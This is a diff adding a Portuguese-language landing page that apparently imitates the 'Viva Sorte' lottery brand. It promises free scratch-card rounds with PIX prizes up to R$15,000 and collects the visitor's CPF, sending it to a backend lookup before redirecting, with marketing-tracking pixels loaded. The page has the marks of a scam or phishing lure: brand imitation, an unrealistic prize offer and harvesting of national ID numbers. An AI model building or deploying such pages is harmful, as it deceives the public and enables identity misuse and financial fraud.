@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Acesso Seguro</title>
+  <link rel="icon" href="images/favicon.ico" type="image/x-icon" sizes="16x16">
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: linear-gradient(180deg,
+          #0B63E5 0%,
+          /* Azul Viva Sorte forte */
+          #1E7BFF 40%,
+          /* Azul médio */
+          #4DA3FF 75%,
+          /* Azul claro */
+          #EAF2FF 100%
+          /* Branco azulado suave */
+        );
+      font-family: 'Montserrat', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      overflow-x: hidden;
+      min-height: 100vh;
+      padding-bottom: 20px;
+    }
+
+    header {
+      width: 100%;
+      background: linear-gradient(90deg,
+          #0B63E5 0%,
+          /* Azul principal */
+          #1E7BFF 50%,
+          /* Azul destaque */
+          #0B63E5 100%
+          /* Azul principal */
+        );
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      height: 60px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
+    }
+
+
+    header img {
+      height: 28px;
+      flex-shrink: 0;
+    }
+
+    .barra-amarela {
+      width: 3px;
+      height: 20px;
+      border-radius: 6px;
+      background: #FFF100;
+      flex-shrink: 0;
+    }
+
+    .titulo-raspadinha {
+      color: white;
+      font-weight: 600;
+      font-size: 16px;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+
+    /* CARD PRINCIPAL */
+    .card {
+      width: 92%;
+      max-width: 420px;
+      margin-top: 30px;
+      background: #fff;
+      border-radius: 14px;
+      padding: 20px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+      text-align: center;
+    }
+
+    .trevo-container {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .trevo-img {
+      width: 180px;
+      height: 60px;
+      object-fit: contain;
+    }
+
+    .titulo-raspadinha-card {
+      font-size: 1.8rem;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 15px;
+    }
+
+    .subtitulo {
+      font-size: 1rem;
+      font-weight: 600;
+      color: #555;
+      margin-bottom: 25px;
+      line-height: 1.5;
+    }
+
+    .cpf-label {
+      display: block;
+      text-align: left;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 8px;
+      font-size: 1rem;
+    }
+
+    .cpf-input-container {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    .cpf-input {
+      width: 100%;
+      padding: 16px;
+      font-size: 1.1rem;
+      border: 2px solid #ddd;
+      border-radius: 8px;
+      text-align: center;
+      letter-spacing: 1px;
+      background-color: #f8f9fa;
+      transition: all 0.3s;
+    }
+
+    .cpf-input:focus {
+      outline: none;
+      border-color: #3F8BFC;
+      background-color: #fff;
+      box-shadow: 0 0 0 3px rgba(255, 230, 0, 0.1);
+    }
+
+    .cpf-input::placeholder {
+      color: #999;
+      font-weight: 600;
+    }
+
+    .separator {
+      height: 1px;
+      background-color: #e0e0e0;
+      margin: 25px 0;
+    }
+
+    .instrucoes {
+      text-align: left;
+      margin-bottom: 25px;
+    }
+
+    .instrucoes h3 {
+      font-size: 1.3rem;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+
+    .instrucoes ol {
+      padding-left: 20px;
+      margin-bottom: 15px;
+    }
+
+    .instrucoes li {
+      margin-bottom: 10px;
+      color: #555;
+      line-height: 1.5;
+    }
+
+    .instrucoes strong {
+      color: #333;
+    }
+
+    .destaque {
+      background-color: #ebf3ff;
+      padding: 15px;
+      border-radius: 8px;
+      border-left: 4px solid #3F8BFC;
+      margin-top: 15px;
+    }
+
+    .destaque p {
+      margin: 0;
+      color: #333;
+      font-weight: 600;
+    }
+
+    .botao-comecar {
+      width: 100%;
+      background: linear-gradient(135deg,
+          #0B63E5 0%,
+          /* Azul Viva Sorte principal */
+          #1E7BFF 45%,
+          /* Azul médio */
+          #4DA3FF 100%
+          /* Azul claro */
+        );
+
+      color: #ffffff;
+      border: none;
+      border-radius: 8px;
+      padding: 18px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 15px;
+
+      transition: transform 0.25s ease, box-shadow 0.25s ease;
+      box-shadow:
+        0 6px 18px rgba(11, 99, 229, 0.45),
+        0 0 22px rgba(30, 123, 255, 0.35);
+    }
+
+    .botao-comecar:hover {
+      transform: translateY(-2px);
+      box-shadow:
+        0 10px 26px rgba(11, 99, 229, 0.55),
+        0 0 30px rgba(30, 123, 255, 0.45);
+    }
+
+    .botao-comecar:disabled {
+      background: linear-gradient(90deg, #bdbdbd, #9e9e9e);
+      box-shadow: none;
+      cursor: not-allowed;
+      transform: none;
+      opacity: 0.85;
+    }
+
+    .loading {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255, 255, 255, .3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+      margin-right: 10px;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .mensagem-erro {
+      color: #d32f2f;
+      font-size: 0.9rem;
+      margin-top: 5px;
+      text-align: left;
+      display: none;
+    }
+
+    .mensagem-erro.visible {
+      display: block;
+    }
+
+    /* MOBILE AJUSTADO */
+    @media (max-width: 430px) {
+      header {
+        padding: 10px 14px;
+        gap: 10px;
+      }
+
+      .titulo-raspadinha {
+        font-size: 15px;
+      }
+
+      .card {
+        padding: 15px;
+        margin-top: 25px;
+      }
+
+      .titulo-raspadinha-card {
+        font-size: 1.6rem;
+      }
+
+      .trevo-img {
+        width: 180px;
+        height: 60px;
+      }
+
+      .cpf-input {
+        padding: 14px;
+        font-size: 1rem;
+      }
+
+      .botao-comecar {
+        padding: 16px;
+        font-size: 1.1rem;
+      }
+    }
+  </style>
+
+
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids
+    async defer></script>
+
+  <script>
+    window.pixelId = "69cdaa163bf0c4950d3b19f0";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+
+</head>
+
+<body>
+
+  <!-- HEADER -->
+  <header>
+    <img src="images/logo.webp" alt="Logo">
+
+    <div class="barra-amarela"></div>
+    <span class="titulo-raspadinha">Raspadinha</span>
+
+  </header>
+
+  <!-- CARD PRINCIPAL -->
+  <div class="card">
+    <div class="trevo-container">
+      <img src="images/trevo.webp" alt="Trevo da Sorte" class="trevo-img">
+    </div>
+
+    <h1 class="titulo-raspadinha-card">Raspadinha</h1>
+    <p class="subtitulo">Informe seu CPF e clique em "Começar" para iniciar suas rodadas gratuitas.</p>
+
+    <label class="cpf-label">CPF</label>
+    <div class="cpf-input-container">
+      <input type="text" id="cpfInput" class="cpf-input" placeholder="000.000.000-00" maxlength="14"
+        inputmode="numeric">
+      <div id="cpfErro" class="mensagem-erro"></div>
+    </div>
+
+    <div class="separator"></div>
+
+    <div class="instrucoes">
+
+      <div class="destaque">
+        <ol>
+          <li>
+            <strong>Ganhe prêmios de R$10 a R$ 15.000,00 diretamente no seu PIX!</strong><br>
+            O Viva Sorte disponibiliza três rodadas gratuitas por CPF.
+          </li>
+        </ol>
+      </div>
+    </div>
+
+    <button class="botao-comecar" id="botaoComecar" disabled="">Começar</button>
+  </div>
+
+  <script>
+    // Função para aplicar máscara de CPF
+    function aplicarMascaraCPF(cpf) {
+      // Remove tudo que não é número
+      cpf = cpf.replace(/\D/g, '');
+
+      // Aplica a máscara: 000.000.000-00
+      if (cpf.length > 9) {
+        cpf = cpf.substring(0, 3) + '.' + cpf.substring(3, 6) + '.' + cpf.substring(6, 9) + '-' + cpf.substring(9, 11);
+      } else if (cpf.length > 6) {
+        cpf = cpf.substring(0, 3) + '.' + cpf.substring(3, 6) + '.' + cpf.substring(6);
+      } else if (cpf.length > 3) {
+        cpf = cpf.substring(0, 3) + '.' + cpf.substring(3);
+      }
+
+      return cpf;
+    }
+
+    // Função para validar CPF (formato básico)
+    function validarCPF(cpf) {
+      cpf = cpf.replace(/\D/g, '');
+      return cpf.length === 11;
+    }
+
+    // Função para capturar as UTMs da URL anterior
+    function capturarUTMs() {
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const utms = {};
+
+        const utmList = [
+          'utm_source',
+          'utm_medium',
+          'utm_campaign',
+          'utm_term',
+          'utm_content'
+        ];
+
+        utmList.forEach(utm => {
+          const valor = urlParams.get(utm);
+          if (valor && valor.trim() !== '') {
+            utms[utm] = valor.trim();
+          } else {
+            utms[utm] = 'direct';
+          }
+        });
+
+        return utms;
+      } catch (error) {
+        console.log('Erro ao capturar UTMs, usando valores padrão');
+        return {
+          utm_source: 'direct',
+          utm_medium: 'direct',
+          utm_campaign: 'direct',
+          utm_term: 'direct',
+          utm_content: 'direct'
+        };
+      }
+    }
+
+    // Função para consultar a API
+    async function consultarCPF(cpf) {
+      try {
+        const utms = capturarUTMs();
+        const params = new URLSearchParams({
+          cpf: cpf.replace(/\D/g, ''),
+          ...utms
+        });
+
+        const response = await fetch(`api.php?${params.toString()}`, {
+          method: 'GET',
+          headers: {
+            'Accept': 'application/json'
+          }
+        });
+
+        // Tenta ler o corpo da resposta como JSON mesmo se não for OK
+        let data;
+        const text = await response.text();
+        try {
+          data = JSON.parse(text);
+        } catch (e) {
+          console.error('Resposta do servidor não é JSON:', text);
+          throw new Error('O servidor retornou uma resposta inválida. Tente novamente.');
+        }
+
+        if (!response.ok) {
+          // Se o servidor retornou um erro JSON com uma mensagem amigável
+          if (data && data.erro) {
+            throw new Error(data.erro);
+          }
+          throw new Error('Erro na comunicação com o servidor. Status: ' + response.status);
+        }
+
+        if (data.erro) {
+          throw new Error(data.erro);
+        }
+
+        return data;
+      } catch (error) {
+        console.error('Erro detalhado na consulta:', error);
+        throw error;
+      }
+    }
+
+    // Função para redirecionar para a página de raspadinha
+    function redirecionarParaRaspa() {
+      const utms = capturarUTMs();
+      const params = new URLSearchParams(utms);
+      window.location.href = '../raspa/?' + params.toString();
+    }
+
+    // Configurar eventos quando a página carregar
+    document.addEventListener('DOMContentLoaded', function () {
+      const cpfInput = document.getElementById('cpfInput');
+      const botaoComecar = document.getElementById('botaoComecar');
+      const cpfErro = document.getElementById('cpfErro');
+
+      // Aplicar máscara enquanto digita
+      cpfInput.addEventListener('input', function (e) {
+        let valor = e.target.value;
+        let posicaoCursor = e.target.selectionStart;
+
+        // Remove caracteres não numéricos
+        const numerosAntes = valor.substring(0, posicaoCursor).replace(/\D/g, '').length;
+
+        // Aplica máscara
+        e.target.value = aplicarMascaraCPF(valor);
+
+        // Ajusta posição do cursor
+        let numerosApos = 0;
+        let novaPosicao = 0;
+
+        for (let i = 0; i < e.target.value.length && numerosApos < numerosAntes; i++) {
+          if (/\d/.test(e.target.value[i])) {
+            numerosApos++;
+          }
+          novaPosicao = i + 1;
+        }
+
+        e.target.setSelectionRange(novaPosicao, novaPosicao);
+
+        // Limpa mensagem de erro
+        cpfErro.textContent = '';
+        cpfErro.classList.remove('visible');
+
+        // Habilita/desabilita botão
+        botaoComecar.disabled = !validarCPF(e.target.value);
+      });
+
+      // Permitir apenas números, backspace e delete
+      cpfInput.addEventListener('keydown', function (e) {
+        if (!/[\d\b\Delete]/.test(e.key) &&
+          !e.ctrlKey &&
+          !e.metaKey &&
+          !['ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Tab'].includes(e.key)) {
+          e.preventDefault();
+        }
+      });
+
+      // Evento de clique no botão
+      botaoComecar.addEventListener('click', async function () {
+        const cpf = cpfInput.value.replace(/\D/g, '');
+
+        if (!validarCPF(cpfInput.value)) {
+          cpfErro.textContent = 'CPF inválido. Digite 11 números.';
+          cpfErro.classList.add('visible');
+          return;
+        }
+
+        // Mostrar loading
+        botaoComecar.innerHTML = '<span class="loading"></span> Consultando...';
+        botaoComecar.disabled = true;
+        cpfInput.disabled = true;
+        cpfErro.textContent = '';
+        cpfErro.classList.remove('visible');
+
+        try {
+          // Consultar API
+          const resultado = await consultarCPF(cpf);
+
+          // Salvar dados no localStorage
+          localStorage.setItem('usuario_dados', JSON.stringify(resultado));
+          localStorage.setItem('cpf_usuario', cpf);
+          localStorage.setItem('consulta_timestamp', Date.now());
+
+          // Mostrar mensagem de sucesso
+          botaoComecar.textContent = 'CPF validado com sucesso!';
+          botaoComecar.style.backgroundColor = '#2ccb74';
+
+          // Redirecionar após 1 segundo
+          setTimeout(() => {
+            redirecionarParaRaspa();
+          }, 1000);
+
+        } catch (error) {
+          // Mostrar mensagem de erro
+          botaoComecar.innerHTML = 'Começar';
+          botaoComecar.disabled = false;
+          cpfInput.disabled = false;
+
+          cpfErro.textContent = error.message || 'Erro ao consultar CPF. Tente novamente.';
+          cpfErro.classList.add('visible');
+
+          // Focar no input para correção
+          cpfInput.focus();
+        }
+      });
+
+      // Validar CPF ao perder foco
+      cpfInput.addEventListener('blur', function () {
+        if (cpfInput.value && !validarCPF(cpfInput.value)) {
+          cpfErro.textContent = 'CPF inválido. Digite 11 números.';
+          cpfErro.classList.add('visible');
+          botaoComecar.disabled = true;
+        }
+      });
+
+      // Inicializar botão como desabilitado
+      botaoComecar.disabled = true;
+
+      // Tentar preencher CPF do localStorage (se existir)
+      const cpfSalvo = localStorage.getItem('cpf_usuario');
+      if (cpfSalvo) {
+        cpfInput.value = aplicarMascaraCPF(cpfSalvo);
+        if (validarCPF(cpfInput.value)) {
+          botaoComecar.disabled = false;
+        }
+      }
+
+      // Auto-focar no input
+      cpfInput.focus();
+    });
+  </script>
+
+
+</body>
+
+</html>
